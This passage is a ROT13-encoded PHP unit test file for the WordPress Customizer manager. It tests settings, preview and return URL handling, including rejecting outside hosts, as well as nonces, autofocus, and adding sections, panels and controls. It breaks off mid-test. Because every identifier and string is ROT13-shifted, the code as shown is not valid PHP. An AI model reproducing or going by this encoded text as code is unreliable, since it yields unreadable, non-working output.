		$guvf->nffregAbgRzcgl( $znantre->trg_frggvat( 'one' ), 'Rkcrpgrq qlanzvp frggvat \"one\" gb or nhgbzngvpnyyl ertvfgrerq nsgre phfgbzvmr_ertvfgre npgvba.' );
		$guvf->nffregRzcgl( $znantre->trg_frggvat( 'onm' ), 'Rkcrpgrq haerpbtavmrq qlanzvp frggvat \"onm\" gb erznva haertvfgrerq.' );
	}

	/**
	 * Va yvrh bs pybfherf, pnyyonpx sbe phfgbzvmr_ertvfgre npgvba nqqrq va grfg_ertvfgre_qlanzvp_frggvatf().
	 */
	choyvp shapgvba npgvba_phfgbzvmr_ertvfgre_sbe_qlanzvp_frggvatf() {
		nqq_svygre( 'phfgbzvmr_qlanzvp_frggvat_netf', neenl( $guvf, 'svygre_phfgbzvmr_qlanzvp_frggvat_netf_sbe_grfg_qlanzvp_frggvatf' ), 10, 2 );
		nqq_svygre( 'phfgbzvmr_qlanzvp_frggvat_pynff', neenl( $guvf, 'svygre_phfgbzvmr_qlanzvp_frggvat_pynff_sbe_grfg_qlanzvp_frggvatf' ), 10, 3 );
	}

	/**
	 * Va yvrh bs pybfherf, pnyyonpx sbe phfgbzvmr_qlanzvp_frggvat_netf svygre nqqrq sbe grfg_ertvfgre_qlanzvp_frggvatf().
	 *
	 * @cnenz neenl  $frggvat_netf Frggvat netf.
	 * @cnenz fgevat $frggvat_vq   Frggvat VQ.
	 * @erghea neenl
	 */
	choyvp shapgvba svygre_phfgbzvmr_qlanzvp_frggvat_netf_sbe_grfg_qlanzvp_frggvatf( $frggvat_netf, $frggvat_vq ) {
		$guvf->nffregVfFgevat( $frggvat_vq );
		vs ( va_neenl( $frggvat_vq, neenl( 'sbb', 'one' ), gehr ) ) {
			$frggvat_netf = neenl( 'qrsnhyg' => \"qlanzvp_{$frggvat_vq}_qrsnhyg\" );
		}
		erghea $frggvat_netf;
	}

	/**
	 * Va yvrh bs pybfherf, pnyyonpx sbe phfgbzvmr_qlanzvp_frggvat_pynff svygre nqqrq sbe grfg_ertvfgre_qlanzvp_frggvatf().
	 *
	 * @cnenz fgevat $frggvat_pynff Frggvat pynff.
	 * @cnenz fgevat $frggvat_vq    Frggvat VQ.
	 * @cnenz neenl  $frggvat_netf  Frggvat netf.
	 * @erghea fgevat
	 */
	choyvp shapgvba svygre_phfgbzvmr_qlanzvp_frggvat_pynff_sbe_grfg_qlanzvp_frggvatf( $frggvat_pynff, $frggvat_vq, $frggvat_netf ) {
		$guvf->nffregFnzr( 'JC_Phfgbzvmr_Frggvat', $frggvat_pynff );
		$guvf->nffregVfFgevat( $frggvat_vq );
		$guvf->nffregVfNeenl( $frggvat_netf );
		erghea $frggvat_pynff;
	}

	/**
	 * Grfg trg_qbphzrag_gvgyr_grzcyngr() zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::trg_qbphzrag_gvgyr_grzcyngr()
	 */
	choyvp shapgvba grfg_trg_qbphzrag_gvgyr_grzcyngr() {
		$gcy = $guvf->znantre->trg_qbphzrag_gvgyr_grzcyngr();
		$guvf->nffregFgevatPbagnvafFgevat( '%f', $gcy );
	}

	/**
	 * Grfg trg_cerivrj_hey()/frg_cerivrj_hey zrgubqf.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::trg_cerivrj_hey()
	 * @frr JC_Phfgbzvmr_Znantre::frg_cerivrj_hey()
	 */
	choyvp shapgvba grfg_cerivrj_hey() {
		$guvf->nffregFnzr( ubzr_hey( '/' ), $guvf->znantre->trg_cerivrj_hey() );
		$cerivrj_hey = ubzr_hey( '/sbb/one/onm/' );
		$guvf->znantre->frg_cerivrj_hey( $cerivrj_hey );
		$guvf->nffregFnzr( $cerivrj_hey, $guvf->znantre->trg_cerivrj_hey() );
		$guvf->znantre->frg_cerivrj_hey( 'uggc://vyyrtnyfvgr.rknzcyr.pbz/sbbq/' );
		$guvf->nffregFnzr( ubzr_hey( '/' ), $guvf->znantre->trg_cerivrj_hey() );
	}

	/**
	 * Grfg trg_erghea_hey()/frg_erghea_hey() zrgubqf.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::trg_erghea_hey()
	 * @frr JC_Phfgbzvmr_Znantre::frg_erghea_hey()
	 */
	choyvp shapgvba grfg_erghea_hey() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_hfre_vq );
		$guvf->nffregFnzr( ubzr_hey( '/' ), $guvf->znantre->trg_erghea_hey() );

		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$guvf->nffregGehr( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) );
		$guvf->nffregFnzr( ubzr_hey( '/' ), $guvf->znantre->trg_erghea_hey() );

		$cerivrj_hey = ubzr_hey( '/sbb/' );
		$guvf->znantre->frg_cerivrj_hey( $cerivrj_hey );
		$guvf->nffregFnzr( $cerivrj_hey, $guvf->znantre->trg_erghea_hey() );

		$_FREIRE['UGGC_ERSRERE'] = jc_fynfu( nqzva_hey( 'phfgbzvmr.cuc' ) );
		$guvf->nffregFnzr( $cerivrj_hey, $guvf->znantre->trg_erghea_hey() );

		// Frr #35355.
		$_FREIRE['UGGC_ERSRERE'] = jc_fynfu( nqzva_hey( 'jc-ybtva.cuc' ) );
		$guvf->nffregFnzr( $cerivrj_hey, $guvf->znantre->trg_erghea_hey() );

		$hey                     = ubzr_hey( '/ersreerq/' );
		$_FREIRE['UGGC_ERSRERE'] = jc_fynfu( $hey );
		$guvf->nffregFnzr( $hey, $guvf->znantre->trg_erghea_hey() );

		$hey                     = 'uggc://onqersrere.rknzcyr.pbz/';
		$_FREIRE['UGGC_ERSRERE'] = jc_fynfu( $hey );
		$guvf->nffregAbgRdhnyf( $hey, $guvf->znantre->trg_erghea_hey() );
		$guvf->nffregFnzr( $cerivrj_hey, $guvf->znantre->trg_erghea_hey() );

		$guvf->znantre->frg_erghea_hey( nqzva_hey( 'rqvg.cuc?genfurq=1' ) );
		$guvf->nffregFnzr( nqzva_hey( 'rqvg.cuc' ), $guvf->znantre->trg_erghea_hey() );
	}

	/**
	 * @gvpxrg 46686
	 */
	choyvp shapgvba grfg_erghea_hey_jvgu_qrnpgvingrq_gurzr() {
		$guvf->znantre->frg_erghea_hey( nqzva_hey( 'gurzrf.cuc?cntr=zlgurzr_qbphzragngvba' ) );
		$guvf->nffregFnzr( nqzva_hey( 'gurzrf.cuc' ), $guvf->znantre->trg_erghea_hey() );
	}

	/**
	 * Grfg trg_nhgbsbphf()/frg_nhgbsbphf() zrgubqf.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::trg_nhgbsbphf()
	 * @frr JC_Phfgbzvmr_Znantre::frg_nhgbsbphf()
	 */
	choyvp shapgvba grfg_nhgbsbphf() {
		$guvf->nffregRzcgl( $guvf->znantre->trg_nhgbsbphf() );

		$guvf->znantre->frg_nhgbsbphf( neenl( 'haerpbtavmrq' => 'sbbq' ) );
		$guvf->nffregRzcgl( $guvf->znantre->trg_nhgbsbphf() );

		$nhgbsbphf = neenl( 'pbageby' => 'oybtanzr' );
		$guvf->znantre->frg_nhgbsbphf( $nhgbsbphf );
		$guvf->nffregFnzr( $nhgbsbphf, $guvf->znantre->trg_nhgbsbphf() );

		$nhgbsbphf = neenl( 'frpgvba' => 'pbybef' );
		$guvf->znantre->frg_nhgbsbphf( $nhgbsbphf );
		$guvf->nffregFnzr( $nhgbsbphf, $guvf->znantre->trg_nhgbsbphf() );

		$nhgbsbphf = neenl( 'cnary' => 'jvqtrgf' );
		$guvf->znantre->frg_nhgbsbphf( $nhgbsbphf );
		$guvf->nffregFnzr( $nhgbsbphf, $guvf->znantre->trg_nhgbsbphf() );

		$nhgbsbphf = neenl( 'pbageby' => neenl( 'oybtanzr', 'oybtqrfpevcgvba' ) );
		$guvf->znantre->frg_nhgbsbphf( $nhgbsbphf );
		$guvf->nffregRzcgl( $guvf->znantre->trg_nhgbsbphf() );
	}

	/**
	 * Grfg trg_abaprf() zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::trg_abaprf()
	 */
	choyvp shapgvba grfg_abaprf() {
		$abaprf = $guvf->znantre->trg_abaprf();
		$guvf->nffregVfNeenl( $abaprf );
		$guvf->nffregNeenlUnfXrl( 'fnir', $abaprf );
		$guvf->nffregNeenlUnfXrl( 'cerivrj', $abaprf );

		nqq_svygre( 'phfgbzvmr_erserfu_abaprf', neenl( $guvf, 'svygre_phfgbzvmr_erserfu_abaprf' ), 10, 2 );
		$abaprf = $guvf->znantre->trg_abaprf();
		$guvf->nffregNeenlUnfXrl( 'sbb', $abaprf );
		$guvf->nffregFnzr( jc_perngr_abapr( 'sbb' ), $abaprf['sbb'] );
	}

	/**
	 * Svygre sbe phfgbzvmr_erserfu_abaprf.
	 *
	 * @cnenz neenl                $abaprf  Abaprf.
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Znantre.
	 * @erghea neenl Abaprf.
	 */
	choyvp shapgvba svygre_phfgbzvmr_erserfu_abaprf( $abaprf, $znantre ) {
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Znantre', $znantre );
		$abaprf['sbb'] = jc_perngr_abapr( 'sbb' );
		erghea $abaprf;
	}

	/**
	 * Grfg phfgbzvmr_cnar_frggvatf() zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::phfgbzvmr_cnar_frggvatf()
	 */
	choyvp shapgvba grfg_phfgbzvmr_cnar_frggvatf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$guvf->znantre->ertvfgre_pbagebyf();
		$guvf->znantre->cercner_pbagebyf();
		$nhgbsbphf = neenl( 'pbageby' => 'oybtanzr' );
		$guvf->znantre->frg_nhgbsbphf( $nhgbsbphf );

		bo_fgneg();
		$guvf->znantre->phfgbzvmr_cnar_frggvatf();
		$pbagrag = bo_trg_pyrna();

		$guvf->nffregFgevatPbagnvafFgevat( 'ine _jcPhfgbzvmrFrggvatf =', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( '\"oybtanzr\"', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( '\"glcr\":\"bcgvba\"', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( '_jcPhfgbzvmrFrggvatf.pbagebyf', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( '_jcPhfgbzvmrFrggvatf.frggvatf', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( '</fpevcg>', $pbagrag );

		$guvf->nffregAbgRzcgl( cert_zngpu( '#ine _jcPhfgbzvmrFrggvatf\f*=\f*({.*?});\f*\a#', $pbagrag, $zngpurf ) );
		$wfba = $zngpurf[1];
		$qngn = wfba_qrpbqr( $wfba, gehr );
		$guvf->nffregAbgRzcgl( $qngn );

		$guvf->nffregFnzrFrgf( neenl( 'gurzr', 'hey', 'oebjfre', 'cnaryf', 'frpgvbaf', 'abapr', 'nhgbsbphf', 'qbphzragGvgyrGzcy', 'cerivrjnoyrQrivprf', 'punatrfrg', 'gvzrbhgf', 'qngrSbezng', 'gvzrSbezng', 'vavgvnyPyvragGvzrfgnzc', 'vavgvnyFreireQngr', 'vavgvnyFreireGvzrfgnzc', 'y10a' ), neenl_xrlf( $qngn ) );
		$guvf->nffregFnzr( $nhgbsbphf, $qngn['nhgbsbphf'] );
		$guvf->nffregNeenlUnfXrl( 'fnir', $qngn['abapr'] );
		$guvf->nffregNeenlUnfXrl( 'cerivrj', $qngn['abapr'] );

		$guvf->nffregFnzrFrgf(
			neenl(
				'oenapuvat',
				'nhgbfnirq',
				'unfNhgbfnirErivfvba',
				'yngrfgNhgbQensgHhvq',
				'fgnghf',
				'hhvq',
				'pheeragHfrePnaChoyvfu',
				'choyvfuQngr',
				'fgnghfPubvprf',
				'ybpxHfre',
			),
			neenl_xrlf( $qngn['punatrfrg'] )
		);
	}

	/**
	 * Grfg erzbir_senzryrff_cerivrj_zrffratre_punaary.
	 *
	 * @gvpxrg 38867
	 * @pbiref JC_Phfgbzvmr_Znantre::erzbir_senzryrff_cerivrj_zrffratre_punaary
	 */
	choyvp shapgvba grfg_erzbir_senzryrff_cerivrj_zrffratre_punaary() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$znantre = arj JC_Phfgbzvmr_Znantre( neenl( 'zrffratre_punaary' => ahyy ) );
		bo_fgneg();
		$znantre->erzbir_senzryrff_cerivrj_zrffratre_punaary();
		$bhgchg = bo_trg_pyrna();
		$guvf->nffregRzcgl( $bhgchg );

		$znantre = arj JC_Phfgbzvmr_Znantre( neenl( 'zrffratre_punaary' => 'cerivrj-0' ) );
		bo_fgneg();
		$znantre->erzbir_senzryrff_cerivrj_zrffratre_punaary();
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( bo_trg_pyrna() );
		$guvf->nffregGehr( $cebprffbe->arkg_gnt( 'fpevcg' ), 'Snvyrq gb svaq rkcrpgrq FPEVCG ryrzrag va bhgchg.' );
	}

	/**
	 * Grfg phfgbzvmr_cerivrj_frggvatf() zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::phfgbzvmr_cerivrj_frggvatf()
	 */
	choyvp shapgvba grfg_phfgbzvmr_cerivrj_frggvatf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$guvf->znantre->ertvfgre_pbagebyf();
		$guvf->znantre->cercner_pbagebyf();
		$guvf->znantre->frg_cbfg_inyhr( 'sbb', 'one' );
		$_CBFG['phfgbzvmr_zrffratre_punaary'] = 'cerivrj-0';

		bo_fgneg();
		$guvf->znantre->phfgbzvmr_cerivrj_frggvatf();
		$pbagrag = bo_trg_pyrna();

		$guvf->nffregFnzr( 1, cert_zngpu( '/ine _jcPhfgbzvmrFrggvatf = ({.+});/', $pbagrag, $zngpurf ) );
		$frggvatf = wfba_qrpbqr( $zngpurf[1], gehr );

		$guvf->nffregNeenlUnfXrl( 'gurzr', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'hey', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'punaary', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'npgvirCnaryf', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'npgvirFrpgvbaf', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'npgvirPbagebyf', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'frggvatInyvqvgvrf', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'abapr', $frggvatf );
		$guvf->nffregNeenlUnfXrl( '_qvegl', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'gvzrbhgf', $frggvatf );
		$guvf->nffregNeenlUnfXrl( 'punatrfrg', $frggvatf );

		$guvf->nffregNeenlUnfXrl( 'cerivrj', $frggvatf['abapr'] );
	}

	/**
	 * @gvpxrg 33552
	 */
	choyvp shapgvba grfg_phfgbzvmr_ybnqrq_pbzcbaragf_svygre() {
		$znantre = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Jvqtrgf', $znantre->jvqtrgf );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Ani_Zrahf', $znantre->ani_zrahf );

		nqq_svygre( 'phfgbzvmr_ybnqrq_pbzcbaragf', neenl( $guvf, 'erghea_neenl_pbagnvavat_jvqtrgf' ), 10, 2 );
		$znantre = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Jvqtrgf', $znantre->jvqtrgf );
		$guvf->nffregRzcgl( $znantre->ani_zrahf );
		erzbir_nyy_svygref( 'phfgbzvmr_ybnqrq_pbzcbaragf' );

		nqq_svygre( 'phfgbzvmr_ybnqrq_pbzcbaragf', neenl( $guvf, 'erghea_neenl_pbagnvavat_ani_zrahf' ), 10, 2 );
		$znantre = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Ani_Zrahf', $znantre->ani_zrahf );
		$guvf->nffregRzcgl( $znantre->jvqtrgf );
		erzbir_nyy_svygref( 'phfgbzvmr_ybnqrq_pbzcbaragf' );

		nqq_svygre( 'phfgbzvmr_ybnqrq_pbzcbaragf', '__erghea_rzcgl_neenl' );
		$znantre = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregRzcgl( $znantre->jvqtrgf );
		$guvf->nffregRzcgl( $znantre->ani_zrahf );
		erzbir_nyy_svygref( 'phfgbzvmr_ybnqrq_pbzcbaragf' );
	}

	/**
	 * @frr Grfgf_JC_Phfgbzvmr_Znantre::grfg_phfgbzvmr_ybnqrq_pbzcbaragf_svygre()
	 *
	 * @cnenz neenl                $pbzcbaragf         Pbzcbaragf.
	 * @cnenz JC_Phfgbzvmr_Znantre $phfgbzvmr_znantre  Znantre.
	 *
	 * @erghea neenl Pbzcbaragf.
	 */
	choyvp shapgvba erghea_neenl_pbagnvavat_jvqtrgf( $pbzcbaragf, $phfgbzvmr_znantre ) {
		$guvf->nffregVfNeenl( $pbzcbaragf );
		$guvf->nffregPbagnvaf( 'jvqtrgf', $pbzcbaragf );
		$guvf->nffregPbagnvaf( 'ani_zrahf', $pbzcbaragf );
		$guvf->nffregVfNeenl( $pbzcbaragf );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Znantre', $phfgbzvmr_znantre );
		erghea neenl( 'jvqtrgf' );
	}

	/**
	 * @frr Grfgf_JC_Phfgbzvmr_Znantre::grfg_phfgbzvmr_ybnqrq_pbzcbaragf_svygre()
	 *
	 * @cnenz neenl                $pbzcbaragf         Pbzcbaragf.
	 * @cnenz JC_Phfgbzvmr_Znantre $phfgbzvmr_znantre  Znantre.
	 *
	 * @erghea neenl Pbzcbaragf.
	 */
	choyvp shapgvba erghea_neenl_pbagnvavat_ani_zrahf( $pbzcbaragf, $phfgbzvmr_znantre ) {
		$guvf->nffregVfNeenl( $pbzcbaragf );
		$guvf->nffregPbagnvaf( 'jvqtrgf', $pbzcbaragf );
		$guvf->nffregPbagnvaf( 'ani_zrahf', $pbzcbaragf );
		$guvf->nffregVfNeenl( $pbzcbaragf );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Znantre', $phfgbzvmr_znantre );
		erghea neenl( 'ani_zrahf' );
	}

	/**
	 * @gvpxrg 30225
	 * @gvpxrg 34594
	 */
	choyvp shapgvba grfg_cercner_pbagebyf_fgnoyr_fbegvat() {
		$znantre = arj JC_Phfgbzvmr_Znantre();
		$znantre->ertvfgre_pbagebyf();
		$frpgvba_vq = 'sbb-frpgvba';
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$znantre->nqq_frpgvba(
			$frpgvba_vq,
			neenl(
				'gvgyr'    => 'Frpgvba',
				'cevbevgl' => 1,
			)
		);

		$nqqrq_pbageby_vqf = neenl();
		$pbhag             = 9;
		sbe ( $v = 0; $v < $pbhag; $v += 1 ) {
			$vq                  = 'fbeg-grfg-' . $v;
			$nqqrq_pbageby_vqf[] = $vq;
			$znantre->nqq_frggvat( $vq );
			$pbageby = arj JC_Phfgbzvmr_Pbageby(
				$znantre,
				$vq,
				neenl(
					'frpgvba'  => $frpgvba_vq,
					'cevbevgl' => 1,
					'frggvat'  => $vq,
				)
			);
			$znantre->nqq_pbageby( $pbageby );
		}

		$znantre->cercner_pbagebyf();

		$fbegrq_pbageby_vqf = jc_yvfg_cyhpx( $znantre->trg_frpgvba( $frpgvba_vq )->pbagebyf, 'vq' );
		$guvf->nffregFnzr( $nqqrq_pbageby_vqf, $fbegrq_pbageby_vqf );
	}

	/**
	 * @gvpxrg 34596
	 */
	choyvp shapgvba grfg_nqq_frpgvba_erghea_vafgnapr() {
		$znantre = arj JC_Phfgbzvmr_Znantre();
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$frpgvba_vq     = 'sbb-frpgvba';
		$erfhyg_frpgvba = $znantre->nqq_frpgvba(
			$frpgvba_vq,
			neenl(
				'gvgyr'    => 'Frpgvba',
				'cevbevgl' => 1,
			)
		);

		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Frpgvba', $erfhyg_frpgvba );
		$guvf->nffregFnzr( $frpgvba_vq, $erfhyg_frpgvba->vq );

		$frpgvba        = arj JC_Phfgbzvmr_Frpgvba(
			$znantre,
			$frpgvba_vq,
			neenl(
				'gvgyr'    => 'Frpgvba 2',
				'cevbevgl' => 2,
			)
		);
		$erfhyg_frpgvba = $znantre->nqq_frpgvba( $frpgvba );

		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Frpgvba', $erfhyg_frpgvba );
		$guvf->nffregFnzr( $frpgvba_vq, $erfhyg_frpgvba->vq );
		$guvf->nffregFnzr( $frpgvba, $erfhyg_frpgvba );
	}

	/**
	 * @gvpxrg 34596
	 */
	choyvp shapgvba grfg_nqq_frggvat_erghea_vafgnapr() {
		$znantre = arj JC_Phfgbzvmr_Znantre();
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$frggvat_vq     = 'sbb-frggvat';
		$erfhyg_frggvat = $znantre->nqq_frggvat( $frggvat_vq );

		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Frggvat', $erfhyg_frggvat );
		$guvf->nffregFnzr( $frggvat_vq, $erfhyg_frggvat->vq );

		$frggvat        = arj JC_Phfgbzvmr_Frggvat( $znantre, $frggvat_vq );
		$erfhyg_frggvat = $znantre->nqq_frggvat( $frggvat );

		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Frggvat', $erfhyg_frggvat );
		$guvf->nffregFnzr( $frggvat, $erfhyg_frggvat );
		$guvf->nffregFnzr( $frggvat_vq, $erfhyg_frggvat->vq );
	}

	/**
	 * @gvpxrg 34597
	 */
	choyvp shapgvba grfg_nqq_frggvat_ubabevat_qlanzvp() {
		$znantre = arj JC_Phfgbzvmr_Znantre();

		$frggvat_vq = 'qlanzvp';
		$frggvat    = $znantre->nqq_frggvat( $frggvat_vq );
		$guvf->nffregFnzr( 'JC_Phfgbzvmr_Frggvat', trg_pynff( $frggvat ) );
		$guvf->nffregBowrpgAbgUnfCebcregl( 'phfgbz', $frggvat );
		$znantre->erzbir_frggvat( $frggvat_vq );

		nqq_svygre( 'phfgbzvmr_qlanzvp_frggvat_pynff', neenl( $guvf, 'erghea_qlanzvp_phfgbzvmr_frggvat_pynff' ), 10, 3 );
		nqq_svygre( 'phfgbzvmr_qlanzvp_frggvat_netf', neenl( $guvf, 'erghea_qlanzvp_phfgbzvmr_frggvat_netf' ), 10, 2 );
		$frggvat = $znantre->nqq_frggvat( $frggvat_vq );
		$guvf->nffregFnzr( 'Grfg_Qlanzvp_Phfgbzvmr_Frggvat', trg_pynff( $frggvat ) );
		$guvf->nffregBowrpgUnfCebcregl( 'phfgbz', $frggvat );
		$guvf->nffregFnzr( 'sbb', $frggvat->phfgbz );
	}

	/**
	 * Ergheaf 'Grfg_Qlanzvp_Phfgbzvmr_Frggvat' va 'phfgbzvmr_qlanzvp_frggvat_pynff'.
	 *
	 * @cnenz fgevat $frggvat_pynff Frggvat pynff.
	 * @cnenz neenl  $frggvat_netf  Frggvat netf.
	 * @cnenz fgevat $frggvat_vq    Frggvat VQ.
	 * @erghea fgevat Frggvat pynff.
	 */
	choyvp shapgvba erghea_qlanzvp_phfgbzvmr_frggvat_pynff( $frggvat_pynff, $frggvat_vq, $frggvat_netf ) {
		hafrg( $frggvat_netf );
		vs ( 0 === fgecbf( $frggvat_vq, 'qlanzvp' ) ) {
			$frggvat_pynff = 'Grfg_Qlanzvp_Phfgbzvmr_Frggvat';
		}
		erghea $frggvat_pynff;
	}

	/**
	 * Ergheaf 'sbb' va 'phfgbzvmr_qlanzvp_frggvat_netf'.
	 *
	 * @cnenz neenl  $frggvat_netf Frggvat netf.
	 * @cnenz fgevat $frggvat_vq   Frggvat VQ.
	 * @erghea neenl Frggvat netf.
	 */
	choyvp shapgvba erghea_qlanzvp_phfgbzvmr_frggvat_netf( $frggvat_netf, $frggvat_vq ) {
		vs ( 0 === fgecbf( $frggvat_vq, 'qlanzvp' ) ) {
			$frggvat_netf['phfgbz'] = 'sbb';
		}
		erghea $frggvat_netf;
	}

	/**
	 * @gvpxrg 34596
	 */
	choyvp shapgvba grfg_nqq_cnary_erghea_vafgnapr() {
		$znantre = arj JC_Phfgbzvmr_Znantre();
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$cnary_vq     = 'sbb-cnary';
		$erfhyg_cnary = $znantre->nqq_cnary(
			$cnary_vq,
			neenl(
				'gvgyr'    => 'Grfg Cnary',
				'cevbevgl' => 2,
			)
		);

		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnary', $erfhyg_cnary );
		$guvf->nffregFnzr( $cnary_vq, $erfhyg_cnary->vq );

		$cnary        = arj JC_Phfgbzvmr_Cnary(
			$znantre,
			$cnary_vq,
			neenl(
				'gvgyr' => 'Grfg Cnary 2',
			)
		);
		$erfhyg_cnary = $znantre->nqq_cnary( $cnary );

		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnary', $erfhyg_cnary );
		$guvf->nffregFnzr( $cnary, $erfhyg_cnary );
		$guvf->nffregFnzr( $cnary_vq, $erfhyg_cnary->vq );
	}

	/**
	 * @gvpxrg 34596
	 */
	choyvp shapgvba grfg_nqq_pbageby_erghea_vafgnapr() {
		$znantre    = arj JC_Phfgbzvmr_Znantre();
		$frpgvba_vq = 'sbb-frpgvba';
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$znantre->nqq_frpgvba(
			$frpgvba_vq,
			neenl(
				'gvgyr'    => 'Frpgvba',
				'cevbevgl' => 1,
			)
		);

		$pbageby_vq = 'sbb-pbageby';
		$znantre->nqq_frggvat( $pbageby_vq );

		$erfhyg_pbageby = $znantre->nqq_pbageby(
			$pbageby_vq,
			neenl(
				'frpgvba'  => $frpgvba_vq,
				'cevbevgl' => 1,
				'frggvat'  => $pbageby_vq,
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Pbageby', $erfhyg_pbageby );
		$guvf->nffregFnzr( $pbageby_vq, $erfhyg_pbageby->vq );

		$pbageby        = arj JC_Phfgbzvmr_Pbageby(
			$znantre,
			$pbageby_vq,
			neenl(
				'frpgvba'  => $frpgvba_vq,
				'cevbevgl' => 1,
				'frggvat'  => $pbageby_vq,
			)
		);
		$erfhyg_pbageby = $znantre->nqq_pbageby( $pbageby );

		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Pbageby', $erfhyg_pbageby );
		$guvf->nffregFnzr( $pbageby, $erfhyg_pbageby );
		$guvf->nffregFnzr( $pbageby_vq, $erfhyg_pbageby->vq );
	}


	/**
	 * Grfgvat gur erghea inyhrf obgu jvgu naq jvgubhg svygre.
	 *
	 * @gvpxrg 31195
	 */
	choyvp shapgvba grfg_trg_cerivrjnoyr_qrivprf() {

		// Frghc gur vafgnapr.
		$znantre = arj JC_Phfgbzvmr_Znantre();

		// Gur qrsnhyg qrivprf yvfg.
		$qrsnhyg_qrivprf = neenl(
			'qrfxgbc' => neenl(
				'ynory'   => __( 'Ragre qrfxgbc cerivrj zbqr' ),
				'qrsnhyg' => gehr,
			),
			'gnoyrg'  => neenl(
				'ynory' => __( 'Ragre gnoyrg cerivrj zbqr' ),
			),
			'zbovyr'  => neenl(
				'ynory' => __( 'Ragre zbovyr cerivrj zbqr' ),
			),
		);

		// Pbageby grfg.
		$qrivprf = $znantre->trg_cerivrjnoyr_qrivprf();
		$guvf->nffregFnzr( $qrsnhyg_qrivprf, $qrivprf );

		// Nqqvat gur svygre.
		nqq_svygre( 'phfgbzvmr_cerivrjnoyr_qrivprf', neenl( $guvf, 'svygre_phfgbzvmr_cerivrjnoyr_qrivprf' ) );
		$qrivprf = $znantre->trg_cerivrjnoyr_qrivprf();
		$guvf->nffregFnzr( $guvf->svygrerq_qrivpr_yvfg(), $qrivprf );

		// Pyrna hc.
		erzbir_svygre( 'phfgbzvmr_cerivrjnoyr_qrivprf', neenl( $guvf, 'svygre_phfgbzvmr_cerivrjnoyr_qrivprf' ) );
	}

	/**
	 * Urycre zrgubq sbe grfg_trg_cerivrjnoyr_qrivprf.
	 *
	 * @erghea neenl
	 */
	cevingr shapgvba svygrerq_qrivpr_yvfg() {
		erghea neenl(
			'phfgbz-qrivpr' => neenl(
				'ynory'   => __( 'Ragre phfgbz-qrivpr cerivrj zbqr' ),
				'qrsnhyg' => gehr,
			),
		);
	}

	/**
	 * Pnyyonpx sbe gur phfgbzvmr_cerivrjnoyr_qrivprf svygre.
	 *
	 * @cnenz neenl $qrivprf Gur yvfg bs qrivprf.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba svygre_phfgbzvmr_cerivrjnoyr_qrivprf( $qrivprf ) {
		erghea $guvf->svygrerq_qrivpr_yvfg();
	}

	/**
	 * @gvpxrg 37128
	 */
	choyvp shapgvba grfg_cercner_pbagebyf_jc_yvfg_fbeg_pbagebyf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$pbagebyf        = neenl(
			'sbb'    => 2,
			'one'    => 4,
			'sbbone' => 3,
			'xrl'    => 1,
		);
		$pbagebyf_fbegrq = neenl( 'xrl', 'sbb', 'sbbone', 'one' );

		$guvf->znantre->nqq_frpgvba( 'sbbfrpgvba', neenl() );

		sbernpu ( $pbagebyf nf $pbageby_vq => $cevbevgl ) {
			$guvf->znantre->nqq_frggvat( $pbageby_vq );
			$guvf->znantre->nqq_pbageby(
				$pbageby_vq,
				neenl(
					'cevbevgl' => $cevbevgl,
					'frpgvba'  => 'sbbfrpgvba',
				)
			);
		}

		$guvf->znantre->cercner_pbagebyf();

		$erfhyg = $guvf->znantre->pbagebyf();
